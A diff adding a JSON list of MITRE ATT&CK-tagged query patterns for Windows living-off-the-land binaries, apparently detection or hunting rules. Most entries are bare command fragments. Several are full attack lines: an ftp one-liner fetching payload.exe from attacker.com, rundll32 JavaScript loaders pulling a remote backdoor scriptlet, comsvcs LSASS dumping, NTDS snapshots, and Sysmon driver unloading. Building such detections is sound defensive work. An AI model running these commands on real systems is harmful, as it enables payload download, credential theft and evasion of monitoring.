@@ -1,0 +1,1018 @@
+[
+  {
+    "name": "T1105: Mshta.exe",
+    "query": "mshta.exe"
+  },
+  {
+    "name": "T1048: TestWindowRemoteAgent.exe",
+    "query": "TestWindowRemoteAgent.exe start -h -p"
+  },
+  {
+    "name": "T1105: MpCmdRun.exe",
+    "query": "MpCmdRun.exe -DownloadFile -url -path"
+  },
+  {
+    "name": "T1127: vbc.exe",
+    "query": "vbc.exe /target:exe *.vb"
+  },
+  {
+    "name": "T1127: vbc.exe",
+    "query": "vbc -reference:Microsoft.VisualBasic.dll *.vb"
+  },
+  {
+    "name": "T1485: Fsutil.exe",
+    "query": "fsutil.exe file *.dll"
+  },
+  {
+    "name": "T1485: Fsutil.exe",
+    "query": "fsutil.exe usn"
+  },
+  {
+    "name": "T1218: Fsutil.exe",
+    "query": "fsutil.exe trace decode"
+  },
+  {
+    "name": "T1127: vstest.console.exe",
+    "query": "vstest.console.exe *.dll"
+  },
+  {
+    "name": "T1218: Bginfo.exe",
+    "query": "bginfo.exe bginfo.bgi /popup /nolicprompt"
+  },
+  {
+    "name": "T1218: Bginfo.exe",
+    "query": "bginfo.exe bginfo.bgi /popup /nolicprompt"
+  },
+  {
+    "name": "T1218: Bginfo.exe",
+    "query": "\\\\*\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt"
+  },
+  {
+    "name": "T1218: Bginfo.exe",
+    "query": "\\\\*\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt"
+  },
+  {
+    "name": "T1218: Bginfo.exe",
+    "query": "\\\\*\\Tools\\bginfo.exe \\\\*\\webdav\\bginfo.bgi /popup /nolicprompt"
+  },
+  {
+    "name": "T1218: Bginfo.exe",
+    "query": "\\\\*\\Tools\\bginfo.exe \\\\*\\webdav\\bginfo.bgi /popup /nolicprompt"
+  },
+  {
+    "name": "T1564.004: Wmic.exe",
+    "query": "wmic.exe process call create"
+  },
+  {
+    "name": "T1218: Wmic.exe",
+    "query": "wmic.exe process get brief /format:*"
+  },
+  {
+    "name": "T1216: Pester.bat",
+    "query": "Pester.bat [/help|?|-?|/?]"
+  },
+  {
+    "name": "T1216: Pester.bat",
+    "query": "Pester.bat ;*"
+  },
+  {
+    "name": "T1218: Setres.exe",
+    "query": "setres.exe -w -h"
+  },
+  {
+    "name": "T1564.004: Makecab.exe",
+    "query": "makecab"
+  },
+  {
+    "name": "T1218.002: Control.exe",
+    "query": "control.exe"
+  },
+  {
+    "name": "T1127: Dfshim.dll",
+    "query": "rundll32.exe dfshim.dll,ShOpenVerbApplication"
+  },
+  {
+    "name": "T1216: Launch-VsDevShell.ps1",
+    "query": "powershell -ep RemoteSigned -f"
+  },
+  {
+    "name": "T1216: Launch-VsDevShell.ps1",
+    "query": "powershell -ep RemoteSigned -f"
+  },
+  {
+    "name": "T1127: Ttdinject.exe",
+    "query": "TTDInject.exe /ClientParams"
+  },
+  {
+    "name": "T1127: Ttdinject.exe",
+    "query": "ttdinject.exe /ClientScenario TTDRecorder /ddload /ClientParams"
+  },
+  {
+    "name": "T1127: Aspnet_Compiler.exe",
+    "query": "*\\aspnet_compiler.exe -v none -p"
+  },
+  {
+    "name": "T1218.010: Regsvr32.exe",
+    "query": "regsvr32 /s /n /u /i:*"
+  },
+  {
+    "name": "T1218.011: Desk.cpl",
+    "query": "rundll32.exe desk.cpl,InstallScreenSaver"
+  },
+  {
+    "name": "T1127: Remote.exe Powershell",
+    "query": "Remote.exe /s \"powershell.exe\""
+  },
+  {
+    "name": "T1127: Remote.exe",
+    "query": "Remote.exe /s"
+  },
+  {
+    "name": "T1218: wuauclt.exe",
+    "query": "wuauclt.exe /UpdateDeploymentProvider /RunHandlerComServer"
+  },
+  {
+    "name": "T1105: Excel.exe",
+    "query": "Excel.exe http*"
+  },
+  {
+    "name": "T1105: Ngen.exe",
+    "query": "ngen.exe http*"
+  },
+  {
+    "name": "T1218: Runscripthelper.exe",
+    "query": "runscripthelper.exe surfacecheck"
+  },
+  {
+    "name": "T1127: Dxcap.exe",
+    "query": "Dxcap.exe -c"
+  },
+  {
+    "name": "T1218.015: Teams.exe",
+    "query": "teams.exe --disable-gpu-sandbox --gpu-launcher=*"
+  },
+  {
+    "name": "T1202: Wsl.exe",
+    "query": "wsl.exe -e"
+  },
+  {
+    "name": "T1202: Wsl.exe",
+    "query": "wsl.exe -u"
+  },
+  {
+    "name": "T1202: Wsl.exe",
+    "query": "wsl.exe --exec bash -c"
+  },
+  {
+    "name": "T1127: VSDiagnostics.exe",
+    "query": "VSDiagnostics.exe start"
+  },
+  {
+    "name": "T1218: Infdefaultinstall.exe",
+    "query": "InfDefaultInstall.exe Infdefaultinstall.inf"
+  },
+  {
+    "name": "T1218.013: Mavinject.exe",
+    "query": "MavInject.exe 3110"
+  },
+  {
+    "name": "T1564.004: Mavinject.exe",
+    "query": "Mavinject.exe 4172"
+  },
+  {
+    "name": "T1105: IMEWDBLD.exe",
+    "query": "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw"
+  },
+  {
+    "name": "T1127: Ilasm.exe",
+    "query": "ilasm.exe /exe"
+  },
+  {
+    "name": "T1127: Ilasm.exe",
+    "query": "ilasm.exe /dll"
+  },
+  {
+    "name": "T1218: Msconfig.exe",
+    "query": "Msconfig.exe -5"
+  },
+  {
+    "name": "T1003.003: dsdbutil.exe",
+    "query": "dsdbutil.exe \"activate instance ntds\" \"snapshot\""
+  },
+  {
+    "name": "T1218: AgentExecutor.exe",
+    "query": "AgentExecutor.exe -powershell"
+  },
+  {
+    "name": "T1218: SQLToolsPS.exe",
+    "query": "SQLToolsPS.exe -noprofile -command"
+  },
+  {
+    "name": "T1218: Appvlp.exe",
+    "query": "AppVLP.exe"
+  },
+  {
+    "name": "T1218: Xwizard.exe",
+    "query": "xwizard RunWizard"
+  },
+  {
+    "name": "T1218: WorkFolders.exe",
+    "query": "WorkFolders"
+  },
+  {
+    "name": "T1564.004: Wscript.exe",
+    "query": "wscript"
+  },
+  {
+    "name": "T1564.004: Wscript.exe",
+    "query": "echo GetObject(*)"
+  },
+  {
+    "name": "T1564.004: Findstr.exe",
+    "query": "findstr"
+  },
+  {
+    "name": "T1127: Tracker.exe",
+    "query": "Tracker.exe"
+  },
+  {
+    "name": "T1218.011: Shdocvw.dll",
+    "query": "rundll32.exe shdocvw.dll,OpenURL"
+  },
+  {
+    "name": "T1218: Presentationhost.exe",
+    "query": "Presentationhost.exe"
+  },
+  {
+    "name": "T1564.004: Diantz.exe",
+    "query": "diantz.exe"
+  },
+  {
+    "name": "T1036.005: Colorcpl.exe",
+    "query": "colorcpl"
+  },
+  {
+    "name": "T1127: Csc.exe",
+    "query": "csc.exe"
+  },
+  {
+    "name": "T1218.011: Shell32.dll",
+    "query": "rundll32.exe shell32.dll,Control_RunDLL"
+  },
+  {
+    "name": "T1218.011: Shell32.dll",
+    "query": "rundll32.exe shell32.dll,ShellExec_RunDLL"
+  },
+  {
+    "name": "T1218.011: Shell32.dll",
+    "query": "rundll32 SHELL32.DLL,ShellExec_RunDLL"
+  },
+  {
+    "name": "T1202: Wlrmdr.exe",
+    "query": "wlrmdr.exe"
+  },
+  {
+    "name": "T1548.002: Wsreset.exe",
+    "query": "wsreset.exe"
+  },
+  {
+    "name": "T1543.003: Dnscmd.exe",
+    "query": "dnscmd.exe"
+  },
+  {
+    "name": "T1216: Manage-bde.wsf",
+    "query": "set comspec=* cscript c:\\windows\\system32\\manage-bde.wsf"
+  },
+  {
+    "name": "T1216: Manage-bde.wsf",
+    "query": "copy *\\manage-bde.exe cscript.exe *\\manage-bde.wsf"
+  },
+  {
+    "name": "T1127: Wfc.exe",
+    "query": "wfc.exe"
+  },
+  {
+    "name": "T1105: PrintBrm.exe",
+    "query": "PrintBrm -b -d"
+  },
+  {
+    "name": "T1564.004: PrintBrm.exe",
+    "query": "PrintBrm -r -f"
+  },
+  {
+    "name": "T1218.011: Url.dll",
+    "query": "rundll32.exe url.dll,OpenURL"
+  },
+  {
+    "name": "T1218.011: Url.dll",
+    "query": "rundll32.exe url.dll,FileProtocolHandler"
+  },
+  {
+    "name": "T1202: ssh.exe",
+    "query": "ssh localhost"
+  },
+  {
+    "name": "T1202: ssh.exe",
+    "query": "ssh -o ProxyCommand=*"
+  },
+  {
+    "name": "T1003: Createdump.exe",
+    "query": "createdump.exe"
+  },
+  {
+    "name": "T1218: vsls-agent.exe",
+    "query": "vsls-agent.exe --agentExtensionPath"
+  },
+  {
+    "name": "T1218: Rasautou.exe",
+    "query": "rasautou -d powershell.dll -p powershell -a a -e e"
+  },
+  {
+    "name": "T1127: Microsoft.Workflow.Compiler.exe",
+    "query": "Microsoft.Workflow.Compiler.exe"
+  },
+  {
+    "name": "T1105: Finger.exe",
+    "query": "finger"
+  },
+  {
+    "name": "T1218: Provlaunch.exe",
+    "query": "provlaunch.exe"
+  },
+  {
+    "name": "T1218.011: Zipfldr.dll",
+    "query": "rundll32.exe zipfldr.dll,RouteTheCall"
+  },
+  {
+    "name": "T1218.011: Advpack.dll",
+    "query": "rundll32.exe advpack.dll,LaunchINFSection"
+  },
+  {
+    "name": "T1218.011: Advpack.dll",
+    "query": "rundll32.exe advpack.dll,RegisterOCX"
+  },
+  {
+    "name": "T1218.011: Advpack.dll",
+    "query": "rundll32 advpack.dll, RegisterOCX"
+  },
+  {
+    "name": "T1105: CertReq.exe",
+    "query": "CertReq -Post -config"
+  },
+  {
+    "name": "T1040: Pktmon.exe",
+    "query": "pktmon.exe start"
+  },
+  {
+    "name": "T1040: Pktmon.exe",
+    "query": "pktmon.exe filter"
+  },
+  {
+    "name": "T1003.001: Dump64.exe",
+    "query": "dump64.exe out.dmp"
+  },
+  {
+    "name": "T1202: Forfiles.exe",
+    "query": "forfiles /p"
+  },
+  {
+    "name": "T1105: Mspub.exe",
+    "query": "mspub.exe"
+  },
+  {
+    "name": "T1564.004: Extrac32.exe",
+    "query": "extrac32"
+  },
+  {
+    "name": "T1059: FsiAnyCpu.exe",
+    "query": "fsianycpu.exe"
+  },
+  {
+    "name": "T1127: Vshadow.exe",
+    "query": "vshadow.exe -exec=*"
+  },
+  {
+    "name": "T1216: CL_Invocation.ps1",
+    "query": "\\nSyncInvoke"
+  },
+  {
+    "name": "T1105: Visio.exe",
+    "query": "Visio.exe"
+  },
+  {
+    "name": "T1105: Installutil.exe",
+    "query": "InstallUtil.exe"
+  },
+  {
+    "name": "T1218: VSIISExeLauncher.exe",
+    "query": "VSIISExeLauncher.exe -p"
+  },
+  {
+    "name": "T1218: Dotnet.exe",
+    "query": "dotnet.exe"
+  },
+  {
+    "name": "T1562.001: fltMC.exe",
+    "query": "fltMC.exe unload SysmonDrv"
+  },
+  {
+    "name": "T1202: wt.exe",
+    "query": "wt.exe"
+  },
+  {
+    "name": "T1127: Devtoolslauncher.exe",
+    "query": "devtoolslauncher.exe LaunchForDeploy"
+  },
+  {
+    "name": "T1053.002: At.exe",
+    "query": "at.exe"
+  },
+  {
+    "name": "T1105: cmdl32.exe",
+    "query": "cmdl32"
+  },
+  {
+    "name": "T1003.001: Comsvcs.dll",
+    "query": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump full"
+  },
+  {
+    "name": "T1127: Tttracer.exe",
+    "query": "tttracer.exe"
+  },
+  {
+    "name": "T1003: Tttracer.exe",
+    "query": "TTTracer.exe"
+  },
+  {
+    "name": "T1564.004: Regini.exe",
+    "query": "regini.exe"
+  },
+  {
+    "name": "T1105: Certutil.exe",
+    "query": "certutil.exe"
+  },
+  {
+    "name": "T1127: Microsoft.NodejsTools.PressAnyKey.exe",
+    "query": "Microsoft.NodejsTools.PressAnyKey.exe"
+  },
+  {
+    "name": "T1202: Procdump.exe",
+    "query": "procdump.exe -md"
+  },
+  {
+    "name": "T1218: Extexport.exe",
+    "query": "Extexport.exe"
+  },
+  {
+    "name": "T1202: Pcalua.exe",
+    "query": "pcalua.exe"
+  },
+  {
+    "name": "T1564.004: Print.exe",
+    "query": "print /D:*"
+  },
+  {
+    "name": "T1218: Msdt.exe",
+    "query": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE"
+  },
+  {
+    "name": "T1105: MSAccess.exe",
+    "query": "MSAccess.exe"
+  },
+  {
+    "name": "T1218: Ie4uinit.exe",
+    "query": "ie4uinit.exe"
+  },
+  {
+    "name": "T1218: Runonce.exe",
+    "query": "Runonce.exe"
+  },
+  {
+    "name": "T1218.011: Ieadvpack.dll",
+    "query": "rundll32.exe ieadvpack.dll,LaunchINFSection"
+  },
+  {
+    "name": "T1218.011: Ieadvpack.dll",
+    "query": "rundll32.exe ieadvpack.dll,RegisterOCX"
+  },
+  {
+    "name": "T1218.011: Ieadvpack.dll",
+    "query": "rundll32 ieadvpack.dll, RegisterOCX"
+  },
+  {
+    "name": "T1078: Cmdkey.exe",
+    "query": "cmdkey"
+  },
+  {
+    "name": "T1105: OneDriveStandaloneUpdater.exe",
+    "query": "OneDriveStandaloneUpdater"
+  },
+  {
+    "name": "T1127: AppCert.exe",
+    "query": "appcert.exe"
+  },
+  {
+    "name": "T1105: Powerpnt.exe",
+    "query": "Powerpnt.exe"
+  },
+  {
+    "name": "T1218: AccCheckConsole.exe",
+    "query": "AccCheckConsole.exe -window"
+  },
+  {
+    "name": "T1105: Winword.exe",
+    "query": "winword.exe"
+  },
+  {
+    "name": "T1127: dnx.exe",
+    "query": "dnx.exe"
+  },
+  {
+    "name": "T1105: ProtocolHandler.exe",
+    "query": "ProtocolHandler.exe"
+  },
+  {
+    "name": "T1127: rcsi.exe",
+    "query": "rcsi.exe"
+  },
+  {
+    "name": "T1218: VisualUiaVerifyNative.exe",
+    "query": "VisualUiaVerifyNative.exe"
+  },
+  {
+    "name": "T1218.009: Regsvcs.exe",
+    "query": "regsvcs.exe"
+  },
+  {
+    "name": "T1218: Register-cimprovider.exe",
+    "query": "Register-cimprovider -path"
+  },
+  {
+    "name": "T1003: Rpcping.exe",
+    "query": "rpcping -s -e -a -u"
+  },
+  {
+    "name": "T1187: Rpcping.exe",
+    "query": "rpcping /s /e /a /u"
+  },
+  {
+    "name": "T1105: WinProj.exe",
+    "query": "WinProj.exe"
+  },
+  {
+    "name": "T1564.004: Cscript.exe",
+    "query": "cscript"
+  },
+  {
+    "name": "T1564: DeviceCredentialDeployment.exe",
+    "query": "DeviceCredentialDeployment"
+  },
+  {
+    "name": "T1055: coregen.exe",
+    "query": "coregen.exe"
+  },
+  {
+    "name": "T1216.002: Syncappvpublishingserver.vbs",
+    "query": "SyncAppvPublishingServer.vbs"
+  },
+  {
+    "name": "T1127.001: Msbuild.exe",
+    "query": "msbuild.exe"
+  },
+  {
+    "name": "T1218: SettingSyncHost.exe",
+    "query": "SettingSyncHost"
+  },
+  {
+    "name": "T1202: Bash.exe",
+    "query": "bash.exe"
+  },
+  {
+    "name": "T1003.001: adplus.exe",
+    "query": "adplus.exe"
+  },
+  {
+    "name": "T1003.001: DumpMinitool.exe",
+    "query": "DumpMinitool.exe"
+  },
+  {
+    "name": "T1218: Update.exe",
+    "query": "Update.exe"
+  },
+  {
+    "name": "T1127: te.exe",
+    "query": "te.exe"
+  },
+  {
+    "name": "T1127: Jsc.exe",
+    "query": "jsc.exe"
+  },
+  {
+    "name": "T1218.007: Devinit.exe",
+    "query": "devinit.exe"
+  },
+  {
+    "name": "T1546.007: Netsh.exe",
+    "query": "netsh.exe add helper"
+  },
+  {
+    "name": "T1218: Wab.exe",
+    "query": "wab.exe"
+  },
+  {
+    "name": "T1105: Ieexec.exe",
+    "query": "ieexec.exe"
+  },
+  {
+    "name": "T1053.005: Schtasks.exe",
+    "query": "schtasks"
+  },
+  {
+    "name": "T1218: Gpscript.exe",
+    "query": "Gpscript /logon"
+  },
+  {
+    "name": "T1218: Gpscript.exe",
+    "query": "Gpscript /startup"
+  },
+  {
+    "name": "T1127: vsjitdebugger.exe",
+    "query": "Vsjitdebugger.exe"
+  },
+  {
+    "name": "T1218.011: Mshtml.dll",
+    "query": "rundll32.exe Mshtml.dll,PrintHTML"
+  },
+  {
+    "name": "T1216: winrm.vbs",
+    "query": "winrm invoke"
+  },
+  {
+    "name": "T1220: winrm.vbs",
+    "query": "*\\winrm.vbs get"
+  },
+  {
+    "name": "T1105: Desktopimgdownldr.exe",
+    "query": "desktopimgdownldr.exe"
+  },
+  {
+    "name": "T1105: Expand.exe",
+    "query": "expand OR expand.exe"
+  },
+  {
+    "name": "T1564.004: Regedit.exe",
+    "query": "regedit"
+  },
+  {
+    "name": "T1105: Msedge.exe",
+    "query": "msedge.exe *"
+  },
+  {
+    "name": "T1105: Esentutl.exe",
+    "query": "esentutl.exe OR esentutl"
+  },
+  {
+    "name": "T1218: Runexehelper.exe",
+    "query": "runexehelper.exe"
+  },
+  {
+    "name": "T1218: CustomShellHost.exe",
+    "query": "CustomShellHost.exe"
+  },
+  {
+    "name": "T1105: AppInstaller.exe",
+    "query": "ms-appinstaller:*"
+  },
+  {
+    "name": "T1218.008: Odbcconf.exe",
+    "query": "odbcconf"
+  },
+  {
+    "name": "T1218.011: Pcwutl.dll",
+    "query": "rundll32.exe pcwutl.dll,LaunchApplication"
+  },
+  {
+    "name": "T1220: msxsl.exe",
+    "query": "msxsl.exe"
+  },
+  {
+    "name": "T1218.007: Msiexec.exe",
+    "query": "msiexec /quiet"
+  },
+  {
+    "name": "T1218.007: Msiexec.exe",
+    "query": "msiexec /q /i"
+  },
+  {
+    "name": "T1218.007: Msiexec.exe",
+    "query": "msiexec /y"
+  },
+  {
+    "name": "T1218.007: Msiexec.exe",
+    "query": "msiexec /z"
+  },
+  {
+    "name": "T1216.001: Pubprn.vbs",
+    "query": "pubprn.vbs"
+  },
+  {
+    "name": "T1564.004: Cmd.exe",
+    "query": "cmd.exe /c echo regsvr32.exe"
+  },
+  {
+    "name": "T1059.003: Cmd.exe",
+    "query": "cmd.exe - \"<\""
+  },
+  {
+    "name": "T1105: Hh.exe",
+    "query": "HH.exe"
+  },
+  {
+    "name": "T1218: Msdeploy.exe",
+    "query": "msdeploy.exe"
+  },
+  {
+    "name": "T1218.012: Verclsid.exe",
+    "query": "verclsid.exe"
+  },
+  {
+    "name": "T1216: CL_LoadAssembly.ps1",
+    "query": "powershell.exe -command"
+  },
+  {
+    "name": "T1105: Ldifde.exe",
+    "query": "Ldifde"
+  },
+  {
+    "name": "T1127: Cdb.exe",
+    "query": "cdb.exe"
+  },
+  {
+    "name": "T1218.009: Regasm.exe",
+    "query": "regasm.exe"
+  },
+  {
+    "name": "T1003.003: ntdsutil.exe",
+    "query": "ntdsutil.exe"
+  },
+  {
+    "name": "T1127: Dfsvc.exe",
+    "query": "rundll32.exe dfshim.dll,ShOpenVerbApplication"
+  },
+  {
+    "name": "T1202: Conhost.exe",
+    "query": "conhost.exe --headless"
+  },
+  {
+    "name": "T1218.011: Setupapi.dll",
+    "query": "rundll32.exe setupapi.dll,InstallHinfSection"
+  },
+  {
+    "name": "T1202: Scriptrunner.exe",
+    "query": "Scriptrunner.exe"
+  },
+  {
+    "name": "T1218: Atbroker.exe",
+    "query": "ATBroker.exe /start"
+  },
+  {
+    "name": "T1564.004: Tar.exe",
+    "query": "tar -cf"
+  },
+  {
+    "name": "T1564.004: Tar.exe",
+    "query": "tar -xf"
+  },
+  {
+    "name": "T1219: code.exe",
+    "query": "code.exe"
+  },
+  {
+    "name": "T1105: winget.exe",
+    "query": "winget.exe"
+  },
+  {
+    "name": "T1105: Replace.exe",
+    "query": "replace.exe OR replace"
+  },
+  {
+    "name": "T1202: Unregmp2.exe",
+    "query": "rmdir"
+  },
+  {
+    "name": "T1202: OpenConsole.exe",
+    "query": "OpenConsole.exe"
+  },
+  {
+    "name": "T1218: DefaultPack.EXE",
+    "query": "DefaultPack.EXE"
+  },
+  {
+    "name": "T1218: CertOC.exe",
+    "query": "certoc OR certoc.exe"
+  },
+  {
+    "name": "T1216: CL_Mutexverifiers.ps1",
+    "query": "C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1"
+  },
+  {
+    "name": "T1218: Pcwrun.exe",
+    "query": "Pcwrun.exe OR Pcwrun"
+  },
+  {
+    "name": "T1202: Explorer.exe",
+    "query": "explorer.exe /root*"
+  },
+  {
+    "name": "T1567: ConfigSecurityPolicy.exe",
+    "query": "ConfigSecurityPolicy.exe"
+  },
+  {
+    "name": "T1105: Shimgvw.dll",
+    "query": "rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen"
+  },
+  {
+    "name": "T1003: Sqldumper.exe",
+    "query": "sqldumper"
+  },
+  {
+    "name": "T1003: rdrleakdiag.exe",
+    "query": "rdrleakdiag"
+  },
+  {
+    "name": "T1218: OfflineScannerShell.exe",
+    "query": "OfflineScannerShell"
+  },
+  {
+    "name": "T1127: Mftrace.exe",
+    "query": "Mftrace.exe"
+  },
+  {
+    "name": "T1218: Stordiag.exe",
+    "query": "stordiag.exe"
+  },
+  {
+    "name": "T1105: GfxDownloadWrapper.exe",
+    "query": "GfxDownloadWrapper"
+  },
+  {
+    "name": "T1218: AddinUtil.exe",
+    "query": "AddinUtil"
+  },
+  {
+    "name": "T1548.002: Eventvwr.exe",
+    "query": "eventvwr.exe OR eventvwr"
+  },
+  {
+    "name": "T1548.002: Eventvwr.exe",
+    "query": "ysoserial.exe"
+  },
+  {
+    "name": "T1127: csi.exe",
+    "query": "csi.exe"
+  },
+  {
+    "name": "T1003.003: wbadmin.exe",
+    "query": "wbadmin"
+  },
+  {
+    "name": "T1218: Sqlps.exe",
+    "query": "Sqlps.exe"
+  },
+  {
+    "name": "T1564.004: Reg.exe",
+    "query": "reg export"
+  },
+  {
+    "name": "T1003.002: Reg.exe",
+    "query": "reg save"
+  },
+  {
+    "name": "T1059: Fsi.exe",
+    "query": "fsi.exe"
+  },
+  {
+    "name": "T1564.004: Sc.exe",
+    "query": "sc create"
+  },
+  {
+    "name": "T1564.004: Sc.exe",
+    "query": "sc config"
+  },
+  {
+    "name": "T1218.011: Ieframe.dll",
+    "query": "rundll32.exe ieframe.dll,OpenURL"
+  },
+  {
+    "name": "T1547: Pnputil.exe",
+    "query": "pnputil.exe"
+  },
+  {
+    "name": "T1218.015: msedgewebview2.exe",
+    "query": "msedgewebview2.exe"
+  },
+  {
+    "name": "T1218.014: Mmc.exe",
+    "query": "mmc.exe"
+  },
+  {
+    "name": "T1218.003: Cmstp.exe",
+    "query": "cmstp.exe"
+  },
+  {
+    "name": "T1564.004: Bitsadmin.exe",
+    "query": "bitsadmin"
+  },
+  {
+    "name": "T1218.011: Syssetup.dll",
+    "query": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction"
+  },
+  {
+    "name": "T1218.011: Syssetup.dll",
+    "query": "rundll32 syssetup.dll,SetupInfObjectInstallAction"
+  },
+  {
+    "name": "T1105: devtunnel.exe",
+    "query": "devtunnel.exe"
+  },
+  {
+    "name": "T1105: Scrobj.dll",
+    "query": "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib"
+  },
+  {
+    "name": "T1218: Squirrel.exe",
+    "query": "squirrel.exe OR squirrel"
+  },
+  {
+    "name": "T1202: Ftp.exe",
+    "query": "ftp -s:*"
+  },
+  {
+    "name": "T1105: Ftp.exe",
+    "query": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\""
+  },
+  {
+    "name": "T1059.001: Powershell.exe",
+    "query": "powershell.exe -ep"
+  },
+  {
+    "name": "T1059.001: Powershell.exe",
+    "query": "powershell.exe -exec"
+  },
+  {
+    "name": "T1202: winfile.exe",
+    "query": "winfile.exe"
+  },
+  {
+    "name": "T1105: MsoHtmEd.exe",
+    "query": "MsoHtmEd.exe"
+  },
+  {
+    "name": "T1113: Psr.exe",
+    "query": "psr.exe"
+  },
+  {
+    "name": "T1567: DataSvcUtil.exe",
+    "query": "DataSvcUtil"
+  },
+  {
+    "name": "T1218.011: Rundll32.exe",
+    "query": "rundll32.exe AllTheThingsx64,EntryPoint"
+  },
+  {
+    "name": "T1218.011: Rundll32.exe",
+    "query": "rundll32.exe *,EntryPoint"
+  },
+  {
+    "name": "T1218.011: Rundll32.exe",
+    "query": "rundll32.exe javascript:\"\\..\\mshtml.dll,RunHTMLApplication \";eval(\"w=new%20ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");"
+  },
+  {
+    "name": "T1218.011: Rundll32.exe",
+    "query": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").run(\"calc.exe\",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}"
+  },
+  {
+    "name": "T1218.011: Rundll32.exe",
+    "query": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\")"
+  },
+  {
+    "name": "T1564.004: Rundll32.exe",
+    "query": "rundll32 *,DllMain"
+  },
+  {
+    "name": "T1218.011: Rundll32.exe",
+    "query": "rundll32.exe -sta"
+  },
+  {
+    "name": "T1218: iediagcmd.exe",
+    "query": "set windir=*"
+  },
+  {
+    "name": "T1003.003: Diskshadow.exe",
+    "query": "diskshadow.exe"
+  },
+  {
+    "name": "T1202: Diskshadow.exe",
+    "query": "diskshadow* exec"
+  }
+]
